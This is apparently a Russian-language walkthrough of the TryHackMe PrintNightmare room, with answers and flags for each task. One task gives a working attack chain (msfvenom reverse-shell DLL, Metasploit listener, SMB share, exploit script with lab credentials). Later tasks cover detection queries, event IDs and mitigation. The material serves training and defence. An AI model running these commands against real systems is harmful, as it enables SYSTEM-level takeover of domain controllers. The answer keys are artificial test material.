[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [PrintNightmare](https://tryhackme.com/r/room/printnightmarehpzqlp8) 

Всего 9 заданий:
## Задание 1
В этой комнате мы рассмотрим уязвимость Printnightmare с точки зрения нападения и обороны.

По словам Microsoft, « уязвимость удаленного выполнения кода возникает, когда служба диспетчера очереди печати 
Windows неправильно выполняет привилегированные файловые операции. Злоумышленник, успешно воспользовавшийся этой 
уязвимостью, может запустить произвольный код с привилегиями SYSTEM. Затем злоумышленник может устанавливать 
программы, просматривать, изменять или удалять данные или создавать новые учетные записи с полными правами 
пользователя ».

Цели обучения: В этой комнате вы узнаете, что такое уязвимость PrintNightmare, как ее эксплуатировать и смягчить. Вы 
также узнаете о механизмах обнаружения с использованием журналов событий Windows и Wireshark.

Результат: В результате вы будете готовы защитить свою организацию от любых потенциальных атак PrintNightmare. 

Предварительные требования к обучению: перед тем, как присоединиться к этому занятию, вы должны быть знакомы с 
Wireshark , журналами событий Windows, основами Linux и Meterpreter.
### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 2
Microsoft определяет службу Print spooler как службу, которая работает на каждой компьютерной системе. Как вы 
можете догадаться из названия, служба Print spooler управляет процессами печати. Обязанности Print spooler —  
управление заданиями печати, получение файлов для печати, постановка их в очередь и планирование.

Вы можете запустить/остановить/приостановить/возобновить работу службы диспетчера очереди печати, просто перейдя в 
раздел «Службы» в вашей системе Windows.

Услуги:

Свойства диспетчера очереди печати (службы):

Служба диспетчера печати обеспечивает предоставление достаточных ресурсов компьютерам, отправляющим задания на 
печать. Помните ранние дни, когда пользователям приходилось ждать завершения заданий на печать, чтобы выполнить 
другие операции? Что ж, служба диспетчера печати решила эту проблему за нас.

Служба диспетчера очереди печати позволяет системам выступать в качестве клиентов печати, административных клиентов 
или серверов печати. Также важно отметить, что служба диспетчера очереди печати включена по умолчанию на всех 
клиентах и серверах Windows. Для подключения к принтеру необходимо иметь службу диспетчера очереди печати на 
компьютере. Существуют стороннее программное обеспечение и драйверы, предоставляемые производителями принтеров, 
которые не требуют включения службы диспетчера очереди печати. Тем не менее, большинство компаний предпочитают 
использовать службы диспетчера очереди печати.

Контроллеры домена в основном используют службу диспетчера очереди печати для удаления принтеров (процесс удаления 
принтеров, которые больше не используются в сети и были добавлены в качестве объектов в Active Directory). Удаление 
принтеров устраняет проблему для пользователей, обращающихся к несуществующему принтеру. Скоро вы узнаете, почему мы 
упомянули контроллеры домена.

### Ответьте на вопросы ниже
Где можно включить или отключить службу диспетчера очереди печати?

```commandline
Services
```

## Задание 3
Чтобы лучше понять уязвимость PrintNightmare (или любую другую уязвимость), вам следует взять за привычку 
исследовать уязвимости, читая статьи Microsoft по любым CVE, специфичным для Windows, или просматривая Интернет в 
поисках сообщений в блогах сообщества и поставщиков.

Возникла некоторая путаница, связаны ли CVE -2021-1675 и CVE -2021-34527 друг с другом. Они ходят под одним и тем 
же названием: Уязвимость удаленного выполнения кода диспетчера очереди печати Windows и обе связаны с диспетчером 
очереди печати.

Как заявляет Microsoft в FAQ, уязвимость PrintNightmare (CVE-2021-34527) «похожа на уязвимость, которой присвоен 
номер CVE -2021-1675, но отличается от нее.  Вектор атаки также отличается».

Что Microsoft подразумевала под вектором атаки? Чтобы ответить на этот вопрос, давайте рассмотрим различия между 
двумя уязвимостями и добавим хронологию событий.

Согласно определению Microsoft, уязвимость PrintNightmare — это «уязвимость удаленного выполнения кода, которая 
возникает, когда служба очереди печати Windows неправильно выполняет привилегированные файловые операции. 
Злоумышленник, успешно воспользовавшийся этой уязвимостью, может запустить произвольный код с привилегиями SYSTEM. 
Затем злоумышленник может устанавливать программы, просматривать, изменять или удалять данные или создавать новые 
учетные записи с полными правами пользователя».

Запуск произвольного кода подразумевает выполнение любых команд по выбору и предпочтению злоумышленника на машине 
жертвы. 
Предположим, у вас была возможность посмотреть на оба CVE на Microsoft. Вы бы заметили, что векторы атак для обоих 
различны.

Чтобы использовать уязвимость CVE -2021-1675, злоумышленнику потребуется прямой или локальный доступ к машине, чтобы 
использовать вредоносный файл DLL для повышения привилегий. Чтобы успешно использовать уязвимость CVE -2021-34527, 
злоумышленник может удаленно внедрить вредоносный файл DLL.

Показатели уязвимости для CVE -2021-1675:

Показатели уязвимости для CVE -2021-34527:

Хронология:
8 июня 2021 г.: Microsoft выпустила исправление для уязвимости повышения привилегий в службе диспетчера очереди 
печати (CVE -2021-1675).

21 июня 2021 г.: Microsoft пересмотрела уязвимость и изменила ее классификацию на удаленное выполнение кода (RCE).

27 июня 2021 г.: Китайская компания по кибербезопасности QiAnXin опубликовала видео, демонстрирующее локальное 
повышение привилегий (LPE) и RCE.

2 июля 2021 г.: Microsoft присваивает новый идентификатор CVE , так называемый PrintNightmare, уязвимости в службе 
диспетчера очереди печати ( CVE -2021-34527).

6 июля 2021 г.: Microsoft выпустила внеплановый патч (патч, выпущенный в нестандартное время) для устранения 
уязвимости CVE -2021-34527 и предоставляет дополнительные обходные пути для защиты от эксплойта.

Чем опасен PrintNightmare? 

Его можно эксплуатировать по сети; злоумышленнику не нужен прямой доступ к машине.
Доказательство концепции было опубликовано в Интернете.
Служба диспетчера очереди печати включена по умолчанию на контроллерах домена и компьютерах с привилегиями SYSTEM.
### Ответьте на вопросы ниже
Укажите CVE  уязвимости диспетчера очереди печати Windows, делающей возможным удаленное выполнение кода, для которой 
не требуется локальный доступ к машине.
```commandline
CVE-2021-34527
```
На какую дату был назначен CVE для уязвимости в предыдущем вопросе? (мм/дд/гггг)
```commandline
07/02/2021
```

## Задание 4
Чтобы понять, как работает атака и какие журналы и события генерируются, вам нужно надеть Black Hat и запустить 
атаку самостоятельно. Но, конечно, для выполнения этой атаки в среде вашего работодателя, даже если это 
изолированная среда, требуется разрешение от руководства.

Не волнуйтесь, вы можете выполнить атаку против подключенной виртуальной машины, а не в среде вашего работодателя. 

Запустите присоединенную виртуальную машину. Через несколько минут IP вашей машины должен быть: MACHINE_IP 

Чтобы взломать контроллер домена с помощью Attack Box, используя уязвимость PrintNightmare, выполните следующие действия. 

В приведенном ниже примере выходных данных терминала жертвой являетсяMACHINE_IP ,  а злоумышленником — 192.168.0.100. 

Примечание: Как подписчик, запустите Attack Box, если вы еще этого не сделали, прежде чем продолжить. Как бесплатный 
пользователь, эта задача должна быть выполнена на вашей локальной атакующей машине.

Прежде чем продолжить, создайте на рабочем столе 2 каталога:

pn- это будет содержать эксплойт.
share- этот каталог ( /root/Desktop/share ) будет содержать вредоносную DLL , которая будет создана с помощью msfvenom. 

Загрузить CVE -2021-1675.py :

Клон CVE-2021-1675 эксплойт из GitHub
```commandline
root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/CVE-2021-1675.git 
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 173, done.
remote: Counting objects: 100% (173/173), done.
remote: Compressing objects: 100% (105/105), done.
remote: Total 173 (delta 62), reused 133 (delta 36), pack-reused 0
Receiving objects: 100% (173/173), 1.45 MiB | 452.00 KiB/s, done.
Resolving deltas: 100% (62/62), done.
```
Перед запуском Metasploit создайте вредоносную DLL . 

Примечание : В выходных данных терминала ниже злоумышленник — 192.168.0.100. Вам нужно будет заменить его 192.168.0.
100на IP-адрес вашего ATTACK BOX (или OpenVPN IP).

Для создания вредоносной DLL-библиотеки вы будете использовать msfvenom. 

Создать вредоносный DLL с Msfvenom
```commandline
root@attackbox:~/Desktop/pn# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes
Saved as: /root/Desktop/share/malicious.dll
```
Если при запуске этой команды вы видите похожий вывод, значит, вы успешно создали DLL.

Давайте запустим Metasploit .

Запуск Метасплоит
```commandline
root@attackbox:~/Desktop/pn# msfconsole 
=[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf5 >
```
После успешной загрузки Metasploit необходимо настроить обработчик для приема входящего соединения от вредоносной DLL. 

Выполните следующие параметры команд:
```commandline
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost VALUE 
set lport VALUE
```
Примечание : значения LHOST и LPORT должны быть теми же, которые вы использовали для создания вредоносной DLL. 

Настройте Метасплоит слушатель
```commandline
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.0.100
lhost => 192.168.0.100 msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) >
```
Затем запустите его, чтобы он активно ожидал соединения. 

Запустить прослушиватель для приема входящих подключений
```commandline
msf5 exploit(multi/handler) > run -j 
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP on 192.168.0.100:4444
```
Это  -j просто означает, что это можно сделать работой. 

Проверьте Метасплоит Статус работы
```commandline
msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.0.100:4444

msf5 exploit(multi/handler) >
```
Отлично, теперь вам нужно разместить вредоносную DLL в общем ресурсе SMB, запущенном на компьютере атакующего. В 
этом примере мы будем использовать AttackBox.

Ниже показано, как это сделать с помощью smbserver.py из Impacket.

Запустите общий ресурс SMB с Impacket для размещения вредоносного кода.
DLL
```commandline
root@attackbox:~/Desktop/pn# smbserver.py share /root/Desktop/share/ -smb2support 
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Краткое пояснение команды на изображении выше:

Это имя общего ресурса SMB для выполнения эксплойта. (Пример: \\ATTACKER_IP\share\malicious.dll )
Это локальная папка, в которой будет храниться вредоносная DLL . (Пример: /root/Desktop/share/malicious.dll )
Прежде чем слепо применить эксплойт к цели, давайте сначала проверим, соответствует ли цель критериям для ее эксплуатации.

Проверьте, уязвима ли цель для этого эксплойта
```commandline
root@attackbox:~/Desktop/pn# rpcdump.py @MACHINE_IP | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```
Да, выглядит хорошо.  Наконец-то пришло время запустить эксплойт. Перейдите в папку, куда вы скачали код эксплойта с 
GitHub, это должно быть . /root/Desktop/pn/CVE-2021-1675

Мы воспользуемся скриптом Python для эксплуатации уязвимости PrintNightmare против контроллера домена Windows 2019.

Синтаксис эксплойт-кода
```commandline
root@attackbox:~/Desktop/pn/CVE-2021-1675# python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@MACHINE_IP '\\192.168.0.100\share\malicious.dll'
```
Краткое пояснение команды на изображении выше:
```commandline

```
python3.9 CVE -2021-1675.py -> вы указываете Python запустить следующий скрипт Python. Значения, которые следуют 
ниже, являются параметрами, необходимыми скрипту для успешного использования уязвимости PrintNightmare.
Finance-01.THMdepartment.local -> имя контроллера домена ( Finance-01 ) вместе с именем домена ( THMdepartment.local )
sjohnston:mindheartbeauty76@MACHINE_IP  -> имя пользователя и пароль для учетной записи пользователя Windows с 
низкими привилегиями.
\\ATTACKER_IP_ADDRESS\share\malicious.dll -> местоположение пути SMB, где хранится вредоносная DLL. 
Если все пойдет хорошо, вы должны увидеть результат, аналогичный изображенному ниже.

Запустить эксплойт
```commandline
root@attackbox:~/Desktop/pn/CVE-2021-1675# python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@MACHINE_IP '\\192.168.0.100\share\malicious.dll'
[*] Connecting to ncacn_np:MACHINE_IP[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.0.100\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
[*] Stage0: 0
```
Вы можете увидеть ошибки Python после Try 3..., но их можно смело игнорировать.

На компьютере злоумышленника вы должны увидеть SMB-соединение, вызывающее вредоносный DLL- файл.

Жертва подключается к общему ресурсу SMB для вредоносного
DLL
```commandline
root@attackbox:~/Desktop/pn# ...
[*] Incoming connection (MACHINE_IP,55037)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.210.90,55037)
[*] Remaining connections []
```
Наконец, у вас будет успешный сеанс Meterpreter. 

Входящее соединение получено
`msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to MACHINE_IP [*] Meterpreter session 1 opened (192.168.0.100:4444 -> MACHINE_IP:55038) at 2021-08-17 17:56:31 +0100
`

### Ответьте на вопросы ниже
Какой флаг находится на рабочем столе администратора?
```commandline
THM{SiGBQPMkSvejvmQNEL}
```

## Задание 5
Давайте представим себе наихудший сценарий, что THMdepartment был скомпрометирован через пару дней после выпуска PoC 
для PrintNightmare, и вы являетесь охотником за угрозами THMdepartment. Ваша компания подозревает, что злоумышленник 
использовал PrintNightmare для доступа к контроллеру домена, и ваша задача — найти доказательства или индикаторы 
компрометации.  Итак, следующим вопросом будет: какие индикаторы следует искать, чтобы обнаружить атаку PrintNightmare?

Атакующий, скорее всего, будет использовать rpcdump.py для сканирования уязвимых хостов. После обнаружения уязвимого 
сервера печати атакующий может выполнить код эксплойта (похожий на скрипт Python в предыдущей задаче), который 
загрузит вредоносный файл DLL для эксплуатации уязвимости. Более конкретно, код эксплойта вызовет функцию 
pcAddPrinterDriverEx() из аутентифицированной учетной записи пользователя и загрузит вредоносный файл DLL для 
эксплуатации уязвимости. Функция pcAddPrinterDriverEx()  используется для установки драйвера принтера в системе.

Sygnia поделилась некоторыми советами по охоте на продвинутые угрозы для обнаружения PrintNightmare. При охоте на 
PrintNightmare следует обратить внимание на следующее:

Найдите процесс spoolsv.exe, запускающий rundll32.exe как дочерний процесс без каких-либо аргументов командной строки.
Рассматривая использование функции pcAddPrinterDriverEx(), вы в большинстве случаев обнаружите вредоносную DLL, 
помещенную в одну из этих папок %WINDIR%\system32\spool\drivers\x64\3\ вместе с DLL, которые были загружены 
впоследствии из %WINDIR%\system32\spool\drivers\x64\3\Old\ ( вам следует активно отслеживать папки на предмет 
наличия необычных DLL).
Поиск подозрительных дочерних процессов spoolsv.exe (cmd.exe, powershell.exe и т. д.)
Атакующий может даже использовать Mimikatz для выполнения атаки, в этом случае будет создан драйвер печати с именем 
' QMS 810 '. Это можно обнаружить, зарегистрировав изменения в реестре (например, Sysmon ID 13 ).
Найдите библиотеки DLL, которые являются частью кодов проверки концепции, которые были опубликованы, например, 
MyExploit.dll , evil.dll , addCube.dll , rev.dll , rev2.dll , main64.dll , mimilib.dll . Если они присутствуют на 
конечной точке, вы можете найти их с помощью идентификатора события 808  в Microsoft-Windows-PrintService.
Splunk также проделал большую работу, предоставив нам несколько поисковых запросов для обнаружения:

Определяет диспетчер очереди печати, добавляющий новый драйвер принтера:
```commandline

источник="WinEventLog:Microsoft-Windows-PrintService/Operational"
EventCode=316 category = "Добавление драйвера принтера" Message = "*kernelbase.dll,*" Message = "*UNIDRV.DLL,*" Message = "*.DLL.*" 
| статистика подсчитывает min(_time) как firstTime max(_time) как lastTime по OpCode EventCode ComputerName Сообщение 
Обнаруживает spoolsv.exe с дочерним процессом rundll32.exe:

| tstats подсчитывает min(_time) как firstTime max(_time) как lastTime из
datamodel=Конечная точка.Процессы, где
Процессы.имя_родительского_процесса=spoolsv.exe
Processes.process_name=rundll32.exe от Processes.dest Processes.user
Процессы.родительский_процесс Процессы.имя_процесса Процессы.процесс
Процессы.process_id Процессы.parent_process_id
Подозрительные экземпляры rundll32.exe без каких-либо аргументов командной строки:

| tstats count FROM datamodel=Endpoint.Processes где
Processes.process_name=spoolsv.exe по _времени Processes.process_id Processes.process_name Processes.dest 
| переименовать "Processes.*" в * 
| присоединиться к процессу_guid _time 
    [| tstats подсчитывает min(_time) как firstTime max(_time) как lastTime FROM datamodel=Endpoint.Filesystem где
Filesystem.file_path="*\\spool\\drivers\\x64\\*" Filesystem.file_name="*.dll" по _time
Файловая_система.dest Файловая_система.file_create_time Файловая_система.file_name Файловая_система.file_path 
    | переименовать "Filesystem.*" в * 
    | поля _время назначения время_создания_файла имя_файла путь_файла имя_процесса путь_процесса процесс] 
| дедупликация времени_создания_файла 
| таблица назначения file_create_time, file_name, file_path, process_name
Обнаруживает, что новый плагин принтера не удалось загрузить:

source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909"))
ИЛИ («Диспетчеру печати не удалось загрузить подключаемый модуль» ИЛИ «\\drivers\\x64\\")) 
  | статистика подсчитывает min(_time) как firstTime max(_time) как lastTime по OpCode EventCode ComputerName Сообщение
```
Если вы заинтересованы в изучении Splunk , посетите следующие комнаты:

Сплунжер 101
Сплунц
Сплунжер 2
Сплунжер 3
### Ответьте на вопросы ниже
Укажите путь к первой папке, где вы, скорее всего, найдете загруженную полезную нагрузку DLL.
```commandline
C:\Windows\System32\spool\drivers\x64\3\
```
Укажите функцию, используемую для установки драйверов принтера.
```commandline
pcAddPrinterDriverEx()
```
Какой инструмент может использовать злоумышленник для сканирования уязвимых серверов печати?
```commandline
rpcdump.py
```

## Задание 6
Журналы событий Windows — это подробные записи уведомлений безопасности, системы и приложений, созданные операционной системой Windows. Существуют некоторые журналы, в которых регистрируются события, связанные с деятельностью диспетчера очереди печати. ​​Тем не менее, они могут быть не включены по умолчанию и должны быть настроены с помощью групповой политики Windows или Powershell. 
Журналы, связанные с активностью диспетчера очереди печати :

Microsoft-Windows-PrintService/Администратор
Microsoft-Windows-PrintService/Операционный
Мы можем обнаружить артефакты PrintNightmare, просмотрев события конечной точки или журналы событий Windows, упомянутые выше.

Вы можете искать следующие идентификаторы событий :

Microsoft-Windows-PrintService/ Operational  (идентификатор события 316 ) — найдите «Драйвер принтера [файл] для Windows x64 версии 3 был добавлен или обновлен. Файлы: UNIDRV. DLL , AddUser.dll, AddUser.dll. Действия пользователя не требуются».
Microsoft-Windows-PrintService/Admin ( идентификатор события  808 ) —  источник события безопасности попытался зарегистрироваться (может обнаружить неподписанные драйверы и вредоносные библиотеки DLL, загруженные spoolsv.exe)
Microsoft-Windows-PrintService/Operational (Идентификатор события 811 ) — регистрирует информацию о неудачных операциях. Событие предоставит информацию о полном пути к удаленной DLL .
Microsoft-Windows-SMBClient/Security (идентификатор события 31017 ) — этот идентификатор события также можно использовать для обнаружения неподписанных драйверов, загруженных spoolsv.exe.
Система Windows (идентификатор события 7031) — Операции остановки службы (этот идентификатор события покажет вам неожиданное завершение работы службы диспетчера очереди печати).
Вы также можете использовать Sysmon для обнаружения террора PrintNightmare: 

Microsoft-Windows- Sysmon /Operational (идентификатор события 3 )  - Сетевое подключение ( поиск подозрительных портов)
Microsoft-Windows- Sysmon /Operational  (код события 11 ) - FileCreate (события создания файлов регистрируются, загруженные библиотеки DLL можно найти в каталоге драйвера диспетчера очереди печати:  C:\Windows\System32\spool\drivers\x64\3 )
Microsoft-Windows- Sysmon /Operational  (идентификаторы событий 23 , 26 ) - FileDelete (можно искать удаленные вредоносные DLL)
Вы все еще пытаетесь выяснить, действительно ли имела место атака PrintNightmare.

Вооружившись всеми вышеизложенными знаниями, сможете ли вы обнаружить артефакты PrintNightmare в журналах событий? 
Разверните машину, прикрепленную к этой задаче; она будет видна в режиме разделенного экрана, как только будет готова.

Если вы не видите загрузку виртуальной машины, нажмите кнопку «Показать разделенный вид».

### Ответьте на вопросы ниже
Укажите имя удаленной DLL, включая код ошибки. (без пробела после запятой) 
```commandline
svch0st.dll,0x45A
```
Укажите имя журнала событий и идентификатор события, которое обнаружило удаленную DLL. (без пробела после запятой) 
```commandline
Microsoft-Windows-PrintService/Admin,808
```

Найдите имя источника и идентификатор события, когда служба диспетчера очереди печати неожиданно остановилась, и 
сколько раз это событие было зарегистрировано? (формат: ответ,ответ,ответ)

```commandline
Service Control Manager,7031,1
```

После нескольких шагов по поиску угроз вы теперь более уверены, что это атака PrintNightmare. Найдите соединение 
оболочки атакующего. Укажите имя журнала, идентификатор события и порт назначения. (формат: ответ,ответ,ответ)
```commandline
Microsoft-Windows-Sysmon/Operational,3,4747
```

О нет! Вы думаете, что нашли соединение злоумышленника. Вам нужно знать IP-адрес злоумышленника и имя хоста 
назначения, чтобы разорвать соединение.   Укажите IP-адрес злоумышленника и имя хоста. (формат: ответ, ответ)

```commandline
10.10.210.100,ip-10-10-210-100.eu-west-1.compute.internal
```

Событие Sysmon FileCreated было сгенерировано и зарегистрировано. Укажите полный путь к сброшенной DLL и самое 
раннее время создания в формате UTC. (формат: ответ, гггг-мм-дд чч-мм-сс)

```commandline
C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll,2021-08-13 17:33:37
```

## Задание 7
Захваты пакетов (pcap) играют решающую роль в обнаружении признаков компрометации.

Если вы не знакомы с Wireshark, не волнуйтесь. Вы можете узнать больше о Wireshark и о том, как анализировать 
перехваченные пакеты, присоединившись к комнате Wireshark 101. Это будет очень весело!

Обнаружение атаки PrintNightmare, в частности (CVE-2021-1675 и CVE-2021-34527), путем анализа сетевого трафика не 
так просто, как проверка артефактов, таких как журналы событий Windows на машине жертвы. Злоумышленник полагается на 
добавление драйвера принтера с помощью команд DCE/RPC  RpcAddPrinterDriver или RpcAddPrinterDriverEx.

DCE/RPC означает Distributed Computing Environment/Remote Procedure Calls и является удаленным вызовом процедуры, 
который устанавливает API и сетевой протокол. Но что делает обнаружение атаки сложнее, так это то, что существуют 
законные применения команд RpcAddPrinterDriver или RpcAddPrinterDriverEx , поэтому вы не всегда можете полагаться 
только на анализ сетевого трафика, чтобы быть уверенным, что атака PrintNightmare произошла в вашей среде. Согласно 
Corelight , ее может быть еще сложнее обнаружить, особенно если эксплойт оборачивает вызовы DCE/RPC в шифрование 
SMB3.  Чтобы идентифицировать зашифрованные вызовы DCE/RPC, вам нужно каким-то образом расшифровать и декодировать 
полезные данные, что является трудоемкой задачей.

Corelight также выпустила пакет Zeek, который обнаруживает дополнения драйвера принтера через команды DCE/RPC, 
которые не зашифрованы.

К этой задаче прилагается PCAP- файл атаки PrintNightmare, который вы можете загрузить и открыть в локальном 
экземпляре Wireshark.

Задача: Осмотреть PCAP и ответить на вопросы ниже. 

### Ответьте на вопросы ниже
Каково имя хоста контроллера домена?
```commandline
WIN-1O0UJBNP9G7
```
Что такое локальный домен?
```commandline
printnightmare.local
```
Какая учетная запись пользователя использовалась для эксплуатации уязвимости?
```commandline
lowprivlarry
```
Какая вредоносная DLL использовалась в эксплойте?
```commandline
letmein.dll
```
Какой IP-адрес был у злоумышленника?
```commandline
10.10.124.236
```
Каков был UNC-путь, по которому размещалась вредоносная DLL-библиотека?
```commandline
\\10.10.124.236\sharez
```
В результатах есть зашифрованные пакеты. Какой был ассоциированный протокол?
```commandline
SMB3
```

## Задание 8
Это был не просто кошмар, и теперь вы на 100% уверены, что это была атака PrintNightmare на THMDepartment. Вы 
проверили другие контроллеры домена в вашей сети, и, похоже, они чисты.

Это еще не конец света. Вы все еще можете смягчить или защититься от атаки, отключив диспетчер очереди печати на 
всех контроллерах домена и изменив настройки реестра (если применимо). Как это можно сделать?

Корпорация Microsoft предоставила инструкции по определению того, включена ли служба диспетчера очереди печати, а 
также по ее отключению:

Сначала необходимо определить, запущена ли служба диспетчера очереди печати.

Выполните следующую команду в Windows PowerShell ( запустите от имени администратора):

`Get-Service -Name Spooler
`
Если диспетчер очереди печати запущен или служба не отключена, выберите один из вариантов ниже, чтобы отключить 
службу диспетчера очереди печати или отключить входящую удаленную печать с помощью групповой политики.

Вариант 1) Отключение службы диспетчера очереди печати:

Если отключение службы диспетчера очереди печати подходит для вашей среды, используйте следующие команды PowerShell:

`
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
`
ПРИМЕЧАНИЕ.  Отключая службу диспетчера очереди печати, вы лишаетесь возможности локальной и удаленной печати.

Вариант 2) Отключение входящей удаленной печати через групповую политику:

Параметры групповой политики можно настроить следующим образом:

`Computer Configuration / Administrative Templates / Printers
`
Отключите политику «Разрешить диспетчеру очереди печати принимать клиентские подключения », чтобы заблокировать 
удаленные атаки.

Эта политика заблокирует вектор удаленной атаки, предотвращая входящие удаленные операции печати. Система больше не 
будет работать как сервер печати, но локальная печать на напрямую подключенном устройстве по-прежнему будет работать.

Примечание: Помните, что для того, чтобы групповая политика вступила в силу на всем домене или даже на локальном 
компьютере, вам необходимо выполнить команду  `gpupdate /force`.

Для получения дополнительной информации см.: Использование параметров групповой политики для управления принтерами.

Обновление безопасности для Windows Server 2012, Windows Server 2016 и Windows 10 версии 1607 было выпущено 
корпорацией Microsoft 7 июля 2021 года.

Дополнительные шаги по смягчению последствий, помимо установки обновлений, рекомендованных Microsoft:

Необходимо подтвердить, что следующие параметры реестра установлены на 0 (ноль) или не определены (Примечание: 
указанные ниже разделы реестра не существуют по умолчанию и, следовательно, уже находятся в безопасном состоянии). 
Также проверьте правильность параметров групповой политики (см. раздел часто задаваемых вопросов):

`HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
`
NoWarningNoElevationOnInstall = 0 (DWORD) или не определено (настройка по умолчанию)

UpdatePromptSettings = 0 (DWORD) или не определено (настройка по умолчанию)

Примечание: Если параметру NoWarningNoElevationOnInstall задано значение 1, ваша система изначально становится уязвимой.

### Ответьте на вопросы ниже
Предоставьте два способа ручного отключения службы диспетчера очереди печати. (формат: ответ,ответ)
```commandline
PowerShell,Group Policy
```
Где можно отключить службу диспетчера очереди печати в групповой политике? (формат : без пробелов между косыми чертами)
```commandline
Computer Configuration/Administrative Templates/Printers
```
Введите команду в PowerShell, чтобы определить, включена ли и запущена ли служба диспетчера очереди печати.
```commandline
Get-Service -Name Spooler
```

## Задание 9
Поздравляем! Вы достигли последней главы этой комнаты и спасли THMdepartment от «ужасов» PrintNightmare.

Мы очень надеемся, что вам понравилось и вы узнали несколько полезных приемов защиты, которые помогут вам 
предотвратить атаку PrintNightmare и своевременно отреагировать на нее.

Вот несколько дополнительных ресурсов, которые помогут вам узнать больше об обнаружении PrintNightmare: 

Анализ сети PrintNightmare | JUMPSEC LABS
От Lares Labs: информация об обнаружении и устранении уязвимостей CVE -2021-1675 и CVE -2021-34527
PrintNightmare ( CVE -2021-1675 и CVE 2021-34527) Объяснение

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)